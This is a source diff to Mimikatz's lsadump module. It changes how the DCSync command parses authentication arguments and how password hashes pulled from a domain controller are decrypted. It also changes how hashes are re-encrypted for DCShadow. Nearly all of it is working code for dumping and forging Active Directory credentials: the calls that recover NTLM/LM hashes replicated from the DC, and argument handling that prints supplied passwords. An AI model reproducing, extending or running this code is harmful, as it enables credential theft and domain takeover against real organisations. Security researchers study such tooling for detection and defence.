@@ -35,7 +35,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DRS_HANDLE hDrs = NULL;
 	DSNAME dsName = {0};
 	DRS_MSG_GETCHGREQ getChReq = {0};
-	DWORD dwOutVersion = 0, i;
+	DWORD dwOutVersion = 0, i, AuthnSvc;
 	DRS_MSG_GETCHGREPLY getChRep;
 	ULONG drsStatus;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
@@ -67,29 +67,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 				else
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
-				if(kull_m_string_args_byName(argc, argv, L"authuser", (const wchar_t **) &secIdentity.User, NULL))
-				{
-					secIdentity.UserLength = lstrlen((LPCWSTR) secIdentity.User);
-					if(kull_m_string_args_byName(argc, argv, L"authdomain", (const wchar_t **) &secIdentity.Domain, L""))
-					{
-						secIdentity.DomainLength = lstrlen((LPCWSTR) secIdentity.Domain);
-					}
-					if(kull_m_string_args_byName(argc, argv, L"authpassword", (const wchar_t **) &secIdentity.Password, L""))
-					{
-						secIdentity.PasswordLength = lstrlen((LPCWSTR) secIdentity.Password);
-					}
-				}
-
-				if(secIdentity.UserLength)
-				{
-					kprintf(L"[AUTH] Username: %s\n[AUTH] Domain  : %s\n[AUTH] Password: %s\n", secIdentity.User, secIdentity.Domain, secIdentity.Password);
-				}
-				if(bAuthNtlm)
-				{
-					kprintf(L"[AUTH] Explicit NTLM Mode\n");
-				}
-
-				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
+				kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, &szService, L"ldap", &AuthnSvc, ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), NULL, &secIdentity, NULL, TRUE);
 				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, bAuthNtlm ? RPC_C_AUTHN_WINNT : ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
@@ -193,9 +171,10 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 	DWORD i;
 	BOOL status = FALSE;
 	BYTE data[LM_NTLM_HASH_LENGTH];
+	
 	for(i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
 	{
-		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
+		status = NT_SUCCESS(RtlDecryptNtOwfPwdWithIndex(encodedData + i, &rid, data)); // same as RtlDecryptLmOwfPwdWithIndex for LM hash
 		if(status)
 		{
 			if(isHistory)
@@ -205,7 +184,7 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 			kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
 			kprintf(L"\n");
 		}
-		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+		else PRINT_ERROR(L"RtlDecryptNtOwfPwdWithIndex/RtlDecryptLmOwfPwdWithIndex");
 	}
 	return status;
 }
@@ -233,9 +212,9 @@ void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATT
 		kprintf(L"%u\t", i);
 		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
 		kprintf(L"\t");
-		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(data, &i, clearHash)))
+		if(NT_SUCCESS(RtlDecryptNtOwfPwdWithIndex(data, &i, clearHash)))
 			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
-		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+		else PRINT_ERROR(L"RtlDecryptNtOwfPwdWithIndex");
 
 		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
 		{
@@ -2262,10 +2241,10 @@ BOOL kuhl_m_lsadump_dcshadow_encode_sensitive_value(BOOL fNTLM, DWORD rid, ATTRV
 			status = TRUE;
 			for(i = 0; (i < val->valLen) && status; i += LM_NTLM_HASH_LENGTH)
 			{
-				status = NT_SUCCESS(RtlEncryptDES2blocks1DWORD(val->pVal + i, &rid, data));
+				status = NT_SUCCESS(RtlEncryptNtOwfPwdWithIndex(val->pVal + i, &rid, data));
 				if(status)
 					RtlCopyMemory(val->pVal + i, data, LM_NTLM_HASH_LENGTH);
-				else PRINT_ERROR(L"RtlEncryptDES2blocks1DWORD");
+				else PRINT_ERROR(L"RtlEncryptNtOwfPwdWithIndex");
 			}
 		}
 		else PRINT_ERROR(L"Unexpected hash len (%u)\n", val->valLen);
